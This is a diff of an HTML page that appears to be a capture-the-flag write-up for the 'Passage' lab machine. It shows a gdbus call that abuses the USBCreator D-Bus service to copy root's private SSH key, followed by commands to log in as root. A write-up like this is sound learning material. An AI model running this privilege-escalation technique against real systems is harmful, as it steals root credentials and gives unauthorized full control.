@@ -424,8 +424,16 @@ after that i used the command to get the ssh key of the root user and copied to 
 </blockquote>
 <div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /home/nadav/key true
 <span class="ln">2</span>()
-</code></pre></div><p>so let login to the root user....</p>
-<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>$ssh -i root.key root@passage.htb
+<span class="ln">3</span>
+</code></pre></div><p>copy the key file to my machine and saved it with name root.key then give the permission</p>
+<blockquote>
+<p>user@home:~$ chmod 600 root.key</p>
+</blockquote>
+<p>so let login to the root user.... BOOM</p>
+<blockquote>
+<p>user@home:~$ ssh -i root.key <a href="mailto:root@passage.htb">root@passage.htb</a></p>
+</blockquote>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>#ssh -i root.key root@passage.htb
 <span class="ln">2</span>Last login: Mon Aug 31 15:14:22 2020 from 127.0.0.1
 <span class="ln">3</span>root@passage:~# id
 <span class="ln">4</span>uid=0(root) gid=0(root) groups=0(root)
